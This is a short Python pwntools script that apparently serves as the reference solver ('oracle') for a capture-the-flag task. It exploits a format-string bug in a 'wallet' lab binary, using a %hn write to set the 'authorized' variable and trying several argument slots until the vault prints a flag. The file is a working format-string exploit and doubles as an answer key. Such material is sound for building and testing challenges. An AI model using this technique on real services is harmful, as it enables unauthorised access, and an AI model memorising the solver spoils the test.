#!/usr/bin/env python3
"""Oracle: %hn write of a nonzero short into `authorized` (known address, no PIE),
then quit triggers show_vault(). The input buffer starts at positional arg 8;
place the address in an aligned slot after the format text."""

from pwn import ELF, context, p64, remote

context.log_level = "error"
context.arch = "amd64"
e = ELF("/work/wallet/wallet", checksec=False)
addr = e.symbols["authorized"]
print(f"authorized @ {addr:#x}")

for slot in range(8, 16):
    try:
        r = remote("wallet", 9999, timeout=8)
        r.recvuntil(b"op> ")
        fmt = b"%12c%" + str(slot).encode() + b"$hn"
        payload = fmt.ljust(16, b"\x00") + p64(addr)
        r.sendline(payload)
        r.recvuntil(b"op> ")
        r.sendline(b"quit")
        out = r.recvall(timeout=6).decode(errors="replace")
        r.close()
        if "flag{" in out:
            print(f"[slot {slot}]")
            print(out)
            raise SystemExit(0)
    except SystemExit:
        raise
    except Exception:
        continue
print("oracle failed")
raise SystemExit(1)
